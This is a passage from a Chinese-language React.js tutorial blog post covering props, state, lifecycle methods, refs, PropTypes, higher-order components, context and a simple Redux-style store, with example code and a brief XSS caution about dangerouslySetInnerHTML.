this.props.unlikedText&#125; 👍</div><div class="line">      &lt;/button&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一个组件在输入确定的 props 的时候，能够输出确定的 UI 显示形态。如果想修改props决定的显示形态，可以主动通过重新渲染的方式，<br>把新的props传入到组件当中，这样这个组件中由 props 决定的显示形态也会得到相应的改变。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">class Index extends Component &#123;</div><div class="line">  constructor () &#123;</div><div class="line">    super()</div><div class="line">    this.state = &#123;</div><div class="line">      likedText: &apos;已赞&apos;,</div><div class="line">      unlikedText: &apos;赞&apos;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  handleClickOnChange () &#123;</div><div class="line">    this.setState(&#123;</div><div class="line">      likedText: &apos;取消&apos;,</div><div class="line">      unlikedText: &apos;点赞&apos;</div><div class="line">    &#125;)</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;LikeButton</div><div class="line">          likedText=&#123;this.state.likedText&#125;</div><div class="line">          unlikedText=&#123;this.state.unlikedText&#125; /&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">          &lt;button onClick=&#123;this.handleClickOnChange.bind(this)&#125;&gt;</div><div class="line">            修改 wordings</div><div class="line">          &lt;/button&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>即props 一旦传入,你就不可以在组件内部对它进行修改，但是可以通过父组件主动重新渲染的方式来传入新的 props，从而达到更新的效果</p>
<p>小结<br>state 是让组件控制自己的状态，props 是让外部对组件自己进行配置。<br>没有 state 的组件叫无状态组件（stateless component），设置了 state 的叫做有状态组件（stateful component）<br>因为状态会带来管理的复杂性，所以尽量多地写无状态组件，尽量少地写有状态的组件。这样会降低代码维护的难度，也会在一定程度上增强组件的可复用性。</p>
<h1 id="函数式组件"><a href="#函数式组件" class="headerlink" title="函数式组件"></a>函数式组件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">//普通写法</div><div class="line">class HelloWorld extends Component &#123;</div><div class="line">  constructor() &#123;</div><div class="line">    super()</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  sayHi () &#123;</div><div class="line">    alert(&apos;Hello World&apos;)</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div onClick=&#123;this.sayHi.bind(this)&#125;&gt;Hello World&lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//函数式组件的编写方式</div><div class="line">const HelloWorld = (props) =&gt; &#123;</div><div class="line">  const sayHi = (event) =&gt; alert(&apos;Hello World&apos;)</div><div class="line">  return (</div><div class="line">    &lt;div onClick=&#123;sayHi&#125;&gt;Hello World&lt;/div&gt;</div><div class="line">  )</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以前一个组件是通过继承 Component 来构建，一个子类就是一个组件。而用函数式的组件编写方式是一个函数就是一个组件，但使用方法同普通写法<br>函数式组件只能接受 props 而无法像跟类组件一样可以在 constructor 里面初始化 state。你可以理解函数式组件就是一种只能接受 props 和提供 render 方法的类组件。</p>
<h1 id="渲染列表数据"><a href="#渲染列表数据" class="headerlink" title="渲染列表数据"></a>渲染列表数据</h1><p>如果往 {} 放一个数组，React.js 会帮你把数组里面一个个元素罗列并且渲染出来，如果数组每一项是JSX，就可以将数据渲染到html里面了<br>所以react渲染列表的思路就是,将数组数据利用es6的map方法转换成JSX,再将JSX数组放到render()返回值中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">class Index extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &#123;users.map((user) =&gt; &#123;</div><div class="line">          return (</div><div class="line">            &lt;div&gt;</div><div class="line">              &lt;div&gt;姓名：&#123;user.username&#125;&lt;/div&gt;</div><div class="line">              &lt;div&gt;年龄：&#123;user.age&#125;&lt;/div&gt;</div><div class="line">              &lt;div&gt;性别：&#123;user.gender&#125;&lt;/div&gt;</div><div class="line">              &lt;hr /&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">          )</div><div class="line">        &#125;)&#125;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>进一步优化,将数组每项JSX抽离成自定义组件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">const users = [</div><div class="line">  &#123; username: &apos;Jerry&apos;, age: 21, gender: &apos;male&apos; &#125;,</div><div class="line">  &#123; username: &apos;Tomy&apos;, age: 22, gender: &apos;male&apos; &#125;,</div><div class="line">  &#123; username: &apos;Lily&apos;, age: 19, gender: &apos;female&apos; &#125;,</div><div class="line">  &#123; username: &apos;Lucy&apos;, age: 20, gender: &apos;female&apos; &#125;</div><div class="line">]</div><div class="line"></div><div class="line">class User extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    const &#123; user &#125; = this.props</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;div&gt;姓名：&#123;user.username&#125;&lt;/div&gt;</div><div class="line">        &lt;div&gt;年龄：&#123;user.age&#125;&lt;/div&gt;</div><div class="line">        &lt;div&gt;性别：&#123;user.gender&#125;&lt;/div&gt;</div><div class="line">        &lt;hr /&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Index extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &#123;users.map((user) =&gt; &lt;User user=&#123;user&#125; /&gt;)&#125;</div><div class="line">        &lt;!-- &#123;users.map((user, i) =&gt; &lt;User key=&#123;i&#125; user=&#123;user&#125; /&gt;)&#125; --&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ReactDOM.render(</div><div class="line">  &lt;Index /&gt;,</div><div class="line">  document.getElementById(&apos;root&apos;)</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>但是要注意<br>对于用表达式套数组罗列到页面上的元素，都要为每个元素加上 key 属性，这个 key 必须是每个元素唯一的标识<br>这里用循环计数器 i 作为 key对循环标签User添加key,就不会报需要key的错了<br>{users.map((user) =&gt; <user user="\{user\}">)} 变成 {users.map((user, i) =&gt; <user key="\{i\}" user="\{user\}">)}</user></user></p>
<h1 id="受控组件"><a href="#受控组件" class="headerlink" title="受控组件"></a>受控组件</h1><p>类似于 &lt;input /&gt;、&lt;select /&gt;、&lt;textarea&gt; 这些元素的 value 值被 React.js 所控制、渲染的组件，在 React.js 当中被称为受控组件（Controlled Component）。对于用户可输入的控件，一般都可以让它们成为受控组件.<br>React.js 认为所有的状态都应该由 React.js 的 state 控制，只要类似于 &lt;input /&gt;、&lt;textarea /&gt;、&lt;select /&gt; 这样的输入控件被设置了 value 值，那么它们的值等于state的一个属性值，就会永远以被设置的值为准。值不变，value 就不会变化。<br>在 React.js 当中必须要用 setState 才能更新组件的内容,所以可以通过给输入框绑定监听输入框的 onChange 事件，然后获取到用户输入的内容，再通过 setState 的方式更新 state 中的 value属性绑定的值，这样 输入框的内容才会更新。</p>
<p>子组件可以利用props向父组件传递数据，即，父组件在使用子组件时，添加属性A，并将该A属性值赋值为一个父组件的函数B，<br>子组件在触发数据提交的时候，检查自己的props有没有属性A,如果有的话，将数据以参数的形式，传递给属性A，即<br>this.props.A({key1:value1,key2”value2….})<br>父组件函数B通过函数参数就可以获得传递过来的数据</p>
<p>子组件从父组件获取数据，同样使用props,也就是说，父组件在使用子组件的时候把自己的state的一个属性C赋值给子组件的属性D,<br>子组件通过属性D获取父组件传递过来的数据,在子组件中直接使用props.D的值，但要注意给子组件设置defaultProps，给属性D一个默认值，防止出现不传值的情况<br>这种行为叫做“状态提升”<br>如果将属性D的值，再保存到子组件的state中在使用，那么当其他组件也需要这份数据的时候，将无法使用，因为根本没办法访问,因此采用使用props值的办法，将这种组件之间共享的状态交给组件最近的公共父节点保管，然后通过 props 把状态传递给子组件，这样就可以在组件之间共享数据了</p>
<p>当某个状态被多个组件依赖或者影响的时候，就把该状态提升到这些组件的最近公共父组件中去管理，用 props 传递数据或者函数来管理这种依赖或着影响的行为。<br>对于不会被多个组件依赖和影响的状态（例如某种下拉菜单的展开和收起状态），一般来说只需要保存在组件内部即可，不需要做提升或者特殊的管理。</p>
<h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>React.js 将组件渲染，并且构造 DOM 元素然后塞入页面的过程称为组件的挂载<br>挂载过程:<br>-&gt; constructor() //自身的状态的初始化工作<br>-&gt; componentWillMount()//组件还没挂载完成时进行的组件启动工作，例如 Ajax 数据拉取、定时器的启动。<br>-&gt; render()<br>// 然后构造 DOM 元素插入页面<br>-&gt; componentDidMount() //组件挂载完成以后，也就是 DOM 元素已经插入页面后调用。进行依赖DOM的启动工作<br>// …<br>// 即将从页面中删除, setState 只能在已经挂载或者正在挂载的组件上调用,<br>//组件隐藏的时候，组件的回调函数可能还在不停地尝试 setState,因此会报错<br>-&gt; componentWillUnmount() //组件对应的 DOM 元素从页面中删除之前调用,处理数据清理工作，如定时器的清理<br>// 从页面中删除</p>
<h2 id="更新阶段"><a href="#更新阶段" class="headerlink" title="更新阶段"></a>更新阶段</h2><p> setState 导致 React.js 重新渲染组件并且把组件的变化应用到 DOM 元素上的过程，这是一个组件的变化过程。而 React.js 也提供了一系列的生命周期函数可以让我们在这个组件更新的过程执行一些操作。<br> 关于更新阶段的组件生命周期：<br>shouldComponentUpdate(nextProps, nextState)：你可以通过这个方法控制组件是否重新渲染。如果返回 false 组件就不会重新渲染。这个生命周期在 React.js 性能优化上非常有用。<br>componentWillReceiveProps(nextProps)：组件从父组件接收到新的 props 之前调用。<br>componentWillUpdate()：组件开始重新渲染之前调用。<br>componentDidUpdate()：组件重新渲染并且把更改变更到真实的 DOM 以后调用。<br><a href="https://reactjs.org/docs/react-component.html" target="_blank" rel="external">官方文档</a></p>
<h1 id="ref属性"><a href="#ref属性" class="headerlink" title="ref属性"></a>ref属性</h1><p>通过在html标签或自定义的组件标签中添加 ref属性，可以绑定DOM操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">class AutoFocusInput extends Component &#123;</div><div class="line">  componentDidMount () &#123; //利用组件声明周期函数</div><div class="line">    this.input.focus() //这里的this.input就是页面里的DOM元素，因此可以直接使用DOM API</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;input ref=&#123;(input) =&gt; this.input = input&#125; /&gt; //把input标签DOM元素挂到组件的属性input上</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>input 元素加了一个 ref 属性，这个属性值是一个函数,<br>当 input 元素在页面上挂载完成以后，React.js 就会调用这个函数,函数的参数，就是挂载以后的DOM结点<br>在函数中把这个 DOM 元素设置为组件实例的一个属性，这样就可以通过 this.input 获取到这个 DOM 元素。</p>
<p>但注意,能不用 ref 就不用，因为React.js 本来就可以做到的页面自动更新的操作和事件监听，多余DOM操作，不利于理解和维护</p>
<h1 id="dangerouslySetHTML"><a href="#dangerouslySetHTML" class="headerlink" title="dangerouslySetHTML"></a>dangerouslySetHTML</h1><p>dangerouslySetInnerHTML 属性可以用于动态渲染HTML结构,即将HTML字符串，在页面中显示时,当做HTML去渲染<br>给 dangerouslySetInnerHTML 传入一个对象，这个对象的 __html 属性值就相当于元素的 innerHTML，这样就可以动态渲染元素的 innerHTML 结构了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">constructor() &#123;</div><div class="line">    super()</div><div class="line">    this.state = &#123;</div><div class="line">      content: &apos;&lt;h1&gt;React.js cool!&lt;/h1&gt;&apos;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div</div><div class="line">        className=&apos;editor-wrapper&apos;</div><div class="line">        dangerouslySetInnerHTML=&#123;&#123;__html: this.state.content&#125;&#125; /&gt;</div><div class="line">    )</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>因为设置 innerHTML 可能会导致跨站脚本攻击（XSS），所以 React.js 团队认为把事情搞复杂可以防止（警示）大家滥用这个属性。这个属性不必要的情况就不要使用</p>
<h1 id="style"><a href="#style" class="headerlink" title="style"></a>style</h1><p>在 React.js 中需要把 CSS 属性变成一个对象再传给元素<br>style 接受一个对象，这个对象里面是这个元素的 CSS 属性键值对，原来 CSS 属性中带 - 的元素都必须要去掉 - 换成驼峰命名，如 font-size 换成 fontSize，text-align 换成 textAlign。<br>用对象作为 style 方便动态设置元素的样式。可以用 props 或者 state 中的数据生成样式对象再传给元素，然后用 setState 就可以修改样式，非常灵活</p>
<p>&lt;h1 style={ {fontSize: ‘12px’, color: this.state.color} }&gt;React.js color&lt;/h1&gt;</p>
<h1 id="PropTypes-组件参数类型验证"><a href="#PropTypes-组件参数类型验证" class="headerlink" title="PropTypes 组件参数类型验证"></a>PropTypes 组件参数类型验证</h1><p>给组件的配置参数加上类型验证,就可以验证传进组件的参数是否符合预定的数据类型，报错也能定位问题<br>PropTypes就是react第三方库，用于验证参数类型，即验证传入组件的数据的数据类型<br>npm install –save prop-types<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">import React, &#123; Component &#125; from &apos;react&apos;</div><div class="line">import PropTypes from &apos;prop-types&apos;</div><div class="line"></div><div class="line">class Comment extends Component &#123;</div><div class="line">  static propTypes = &#123;</div><div class="line">    comment: PropTypes.object //指定传入comment的类型必须为Object</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    const &#123; comment &#125; = this.props</div><div class="line">    return (</div><div class="line">      &lt;div className=&apos;comment&apos;&gt;</div><div class="line">        &lt;div className=&apos;comment-user&apos;&gt;</div><div class="line">          &lt;span&gt;&#123;comment.username&#125; &lt;/span&gt;：</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;p&gt;&#123;comment.content&#125;&lt;/p&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>propTypes 指定了参数类型，但是并没有说这个参数一定要传入，事实上，这些参数默认都是可选的。可选参数可以通过配置 defaultProps，让它在不传入的时候有默认值。<br>但是这里并没有配置 defaultProps，所以如果直接用&lt;Comment /&gt; 而不传入任何参数的话，comment 就会是 undefined，<br>可以通过 isRequired 关键字来强制组件某个参数必须传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">static propTypes = &#123;</div><div class="line">  comment: PropTypes.object.isRequired</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>React.js 提供的 PropTypes 提供了一系列的数据类型可以用来配置组件的参数：<br>PropTypes.array<br>PropTypes.bool<br>PropTypes.func<br>PropTypes.number<br>PropTypes.object<br>PropTypes.string<br>PropTypes.node<br>PropTypes.element</p>
<p><a href="https://reactjs.org/docs/typechecking-with-proptypes.html" target="_blank" rel="external">官方文档</a></p>
<h1 id="建议命名和定义顺序"><a href="#建议命名和定义顺序" class="headerlink" title="建议命名和定义顺序"></a>建议命名和定义顺序</h1><p>组件的私有方法都用 _ 开头<br>所有事件监听的方法都用 handle 开头<br>把事件监听方法传给组件的时候，属性名用 on 开头</p>
<p>组件的内容编写顺序如下：</p>
<p>static 开头的类属性，如 defaultProps、propTypes。<br>构造函数，constructor。<br>getter/setter。<br>组件生命周期。<br>_ 开头的私有方法。<br>事件监听方法，handle<em>。<br>render</em>开头的方法，有时候 render() 方法里面的内容会分开到不同函数里面进行，这些函数都以 render* 开头。<br>render() 方法。</p>
<h1 id="高阶组件"><a href="#高阶组件" class="headerlink" title="高阶组件"></a>高阶组件</h1><p>高阶组件就是一个函数，传给它一个组件，它返回一个新的组件,返回的这个新的组件使用传入的组件作为子组件。</p>
<p>高阶组件内部的包装组件和被包装组件之间通过 props 传递数据。</p>
<p>多层高阶组件使用时，this.props是从外向里传递的，即A组件先后被B,C,D组件组装，则this.props到达A组件的顺序是D,C,B,A</p>
<p>高阶组件的作用是用于代码复用，可以把组件之间可复用的代码、逻辑抽离到高阶组件当中。</p>
<p>高阶组件有助于提高我们代码的灵活性，逻辑的复用性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">//高阶组件wrapWithLoadData ,</div><div class="line">import React, &#123; Component &#125; from &apos;react&apos;</div><div class="line"></div><div class="line">export default (WrappedComponent, name) =&gt; &#123;</div><div class="line">  class NewComponent extends Component &#123;</div><div class="line">    constructor () &#123;</div><div class="line">      super()</div><div class="line">      this.state = &#123; data: null &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    componentWillMount () &#123;</div><div class="line">      let data = localStorage.getItem(name)  //如果改变数据获取方式,可以修改这里</div><div class="line">      this.setState(&#123; data &#125;)</div><div class="line">    &#125;</div><div class="line">    //在此之前，可以做很多自定义逻辑</div><div class="line">    render () &#123;</div><div class="line">      return &lt;WrappedComponent data=&#123;this.state.data&#125; /&gt;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return NewComponent</div><div class="line">&#125;</div><div class="line"></div><div class="line">//使用</div><div class="line">import wrapWithLoadData from &apos;./wrapWithLoadData&apos;</div><div class="line"></div><div class="line">class InputWithUserName extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return &lt;input value=&#123;this.props.data&#125; /&gt;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">InputWithUserName = wrapWithLoadData(InputWithUserName, &apos;username&apos;) //组件InputWithUserName以参数传入wrapWithLoadData，进行包装</div><div class="line">export default InputWithUserName</div></pre></td></tr></table></figure>
<h1 id="context"><a href="#context" class="headerlink" title="context"></a>context</h1><p>一个组件可以通过 getChildContext 方法返回一个对象，这个对象就是子树的 context，提供 context 的组件必须提供 childContextTypes 作为 context 的声明和验证。</p>
<p>如果一个组件设置了 context，那么它的子组件都可以直接访问到里面的内容，它就像这个组件为根的子树的全局变量。任意深度的子组件都可以通过 contextTypes 来声明你想要的 context 里面的哪些状态，然后可以通过 this.context 访问到那些状态。</p>
<p>context 打破了组件和组件之间通过 props 传递数据的规范，极大地增强了组件之间的耦合性。而且，就如全局变量一样，context 里面的数据能被随意接触就能被随意修改，每个组件都能够改 context 里面的内容会导致程序的运行不可预料。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">//组件树的根组件</div><div class="line">class Index extends Component &#123;</div><div class="line">  static childContextTypes = &#123; //验证getChildContext 返回的对象  必写!!!</div><div class="line">    themeColor: PropTypes.string</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  constructor () &#123;</div><div class="line">    super()</div><div class="line">    this.state = &#123; themeColor: &apos;red&apos; &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  getChildContext () &#123; //设置 context,返回的对象就是子组件的this.context</div><div class="line">    return &#123; themeColor: this.state.themeColor &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;Header /&gt;</div><div class="line">        &lt;Main /&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">//其中一层的子组件</div><div class="line">class Title extends Component &#123;</div><div class="line">  static contextTypes = &#123; //来声明和验证需要获取的contxt内容的类型 必写!!!</div><div class="line">    themeColor: PropTypes.string</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;h1 style=&#123;&#123; color: this.context.themeColor &#125;&#125;&gt;React.js 小书标题&lt;/h1&gt; //直接使用this.context里面的值</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="redux-模式"><a href="#redux-模式" class="headerlink" title="redux 模式"></a>redux 模式</h1><p>代码中发现了共享的状态如果可以被任意修改的话，那么程序的行为将非常不可预料，所以提高了修改数据的门槛：必须通过 dispatch 执行某些允许的修改操作，而且必须大张旗鼓的在 action 里面声明。</p>
<p>这种模式挺好用的，就把它抽象出来一个 createStore，它可以产生 store，里面包含 getState 和 dispatch 函数，方便使用。</p>
<p>后来发现每次修改数据都需要手动重新渲染非常麻烦，因此希望自动重新渲染视图。所以后来加入了订阅者模式，可以通过 store.subscribe 订阅数据修改事件，每次数据更新的时候自动重新渲染视图。</p>
<p>接下来发现了原来的“重新渲染视图”有比较严重的性能问题（没有发生改变的数据也进行了渲染），我们引入了“共享结构的对象”来帮我们解决问题，这样就可以在每个渲染函数的开头进行简单的判断避免没有被修改过的数据重新渲染。</p>
<p>我们优化了 stateChanger 为 reducer，定义了 reducer 只能是纯函数，功能就是负责初始 state，和根据 state 和 action 计算具有共享结构的新的 state。</p>
<p>createStore 现在可以直接拿来用了，套路就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">function createStore (reducer) &#123;</div><div class="line">  let state = null</div><div class="line">  const listeners = []</div><div class="line">  const subscribe = (listener) =&gt; listeners.push(listener)</div><div class="line">  const getState = () =&gt; state</div><div class="line">  const dispatch = (action) =&gt; &#123;</div><div class="line">    state = reducer(state, action) // 覆盖原对象</div><div class="line">    listeners.forEach((listener) =&gt; listener())</div><div class="line">  &#125;</div><div class="line">  dispatch(&#123;&#125;) // 初始化 state</div><div class="line">  return &#123; getState, dispatch, subscribe &#125;</div><div class="line">&#125;</div><div class="line">// 定一个 reducer</div><div class="line">function reducer (state, action) &#123;</div><div class="line">  /* 初始化 state 和 switch case */</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 生成 store</div><div class="line">const store = createStore(reducer)</div><div class="line"></div><div class="line">// 监听数据变化重新渲染页面</div><div class="line">store.subscribe(() =&gt; renderApp(store.getState()))</div><div class="line"></div><div class="line">// 首次渲染页面</div><div class="line">renderApp(store.getState())</div><div class="line"></div><div class="line">// 后面可以随意 dispatch 了，页面自动更新</div><div class="line">store.dispatch(...)</div></pre></td></tr></table></figure></p>
<p>例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">function createStore (reducer) &#123;</div><div class="line">  let state = null</div><div class="line">  const listeners = []</div><div class="line">  const subscribe = (listener) =&gt; listeners.push(listener)</div><div class="line">  const getState = () =&gt; state</div><div class="line">  const dispatch = (action) =&gt; &#123;</div><div class="line">    state = reducer(state, action) // 覆盖原对象</div><div class="line">    listeners.forEach((listener) =&gt; listener())</div><div class="line">  &#125;</div><div class="line">  dispatch(&#123;&#125;) // 初始化 state</div><div class="line">  return &#123; getState, dispatch, subscribe &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function renderApp (newAppState, oldAppState = &#123;&#125;) &#123; // 防止 oldAppState 没有传入，所以加了默认参数 oldAppState = &#123;&#125;</div><div class="line">  